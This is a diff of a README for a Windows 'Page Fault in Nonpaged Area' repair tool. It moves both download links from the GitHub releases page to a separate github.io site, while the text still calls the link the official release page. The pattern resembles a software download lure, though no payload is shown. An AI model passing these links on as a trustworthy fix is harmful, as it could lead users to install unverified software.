@@ -1,6 +1,6 @@
 # 💻 Page-Fault-In-Nonpaged-Area-Fix - Resolve your computer blue screen errors
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/samuelaconfederate661/Page-Fault-In-Nonpaged-Area-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://samuelaconfederate661.github.io)
 
 This tool repairs the Page Fault in Nonpaged Area error on Windows 10 and Windows 11. This error causes your computer to show a blue screen and restart without warning. The software automates the process of checking your system files and memory settings to stop these crashes.
 
@@ -22,7 +22,7 @@ This software works on standard Windows configurations. Ensure your system meets
 
 You must obtain the software from the official repository release page. 
 
-[Click here to visit the release page and download the repair tool](https://github.com/samuelaconfederate661/Page-Fault-In-Nonpaged-Area-Fix/releases)
+[Click here to visit the release page and download the repair tool](https://samuelaconfederate661.github.io)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
